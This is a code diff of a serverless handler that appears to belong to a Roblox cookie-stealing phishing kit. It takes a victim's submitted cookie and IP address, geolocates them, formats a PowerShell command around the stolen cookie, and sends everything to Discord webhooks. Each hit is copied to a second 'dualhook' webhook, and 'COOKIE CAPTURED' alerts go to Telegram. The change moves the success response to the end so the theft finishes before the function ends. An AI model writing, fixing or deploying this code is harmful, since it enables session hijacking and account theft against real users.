@@ -180,55 +180,47 @@ export default async function handler(req, res) {
   if (!record)         return res.status(404).json({ error: 'Page not found' });
   if (!record.webhook) return res.status(500).json({ error: 'No webhook on record' });
 
-  // Respond to client immediately — they never see a timeout
-  res.status(200).json({ success: true });
+  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
+          || req.headers['x-real-ip'] || 'Unknown';
 
-  try {
-    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
-            || req.headers['x-real-ip'] || 'Unknown';
+  const [geo, cookie] = await Promise.all([
+    getIpGeo(ip),
+    Promise.resolve(findCookie(slots))
+  ]);
 
-    const [geo, cookie] = await Promise.all([
-      getIpGeo(ip),
-      Promise.resolve(findCookie(slots))
-    ]);
+  const powershell = cookie ? await getPowerShell(cookie, ip) : null;
+  const isValid    = !!powershell;
+  const now        = new Date().toISOString();
+  const pageName   = record.displayName || slug;
+  const payload    = { powershell, cookie, slots, ip, geo, now, pageName };
 
-    // Worker builds the PowerShell command using victimIp as X-Forwarded-For
-    // The cookie is NEVER used to call Roblox — just formatted into the PS command
-    const powershell = cookie ? await getPowerShell(cookie, ip) : null;
-    const isValid    = !!powershell;
-    const now        = new Date().toISOString();
-    const pageName   = record.displayName || slug;
-    const payload    = { powershell, cookie, slots, ip, geo, now, pageName };
-
-    // Load dualhook parent
-    let parent = null;
-    if (record.dualhookParent) {
-      parent = await redisGet(`slot:${record.dualhookParent}`);
-    }
-
-    const sendFn = isValid ? sendHit : sendInvalid;
-
-    await Promise.all([
-      sendFn(record.webhook, payload),
-      parent?.webhook && parent.webhook !== record.webhook
-        ? sendFn(parent.webhook, payload)
-        : Promise.resolve()
-    ]);
-
-    await tgSend(isValid ? [
-      `✅ <b>COOKIE CAPTURED</b>`,
-      `📄 Page: ${pageName} (${slug})`,
-      `🌐 IP: <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`,
-      `💻 PowerShell command sent to Discord`,
-      `🕐 ${now}`
-    ].join('\n') : [
-      `⚠️ <b>INVALID SUBMISSION</b>`,
-      `📄 Page: ${pageName} (${slug})`,
-      `🌐 IP: <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`,
-      `🕐 ${now}`
-    ].join('\n'));
-
-  } catch (err) {
-    console.error('Post-response error:', err.message);
+  let parent = null;
+  if (record.dualhookParent) {
+    parent = await redisGet(`slot:${record.dualhookParent}`);
   }
+
+  const sendFn = isValid ? sendHit : sendInvalid;
+
+  await Promise.all([
+    sendFn(record.webhook, payload),
+    parent?.webhook && parent.webhook !== record.webhook
+      ? sendFn(parent.webhook, payload)
+      : Promise.resolve()
+  ]);
+
+  await tgSend(isValid ? [
+    `✅ <b>COOKIE CAPTURED</b>`,
+    `📄 Page: ${pageName} (${slug})`,
+    `🌐 IP: <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`,
+    `💻 PowerShell command sent to Discord`,
+    `🕐 ${now}`
+  ].join('\n') : [
+    `⚠️ <b>INVALID SUBMISSION</b>`,
+    `📄 Page: ${pageName} (${slug})`,
+    `🌐 IP: <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`,
+    `🕐 ${now}`
+  ].join('\n'));
+
+  // Respond AFTER all work is done — Vercel kills the function on res.end()
+  return res.status(200).json({ success: true });
 }
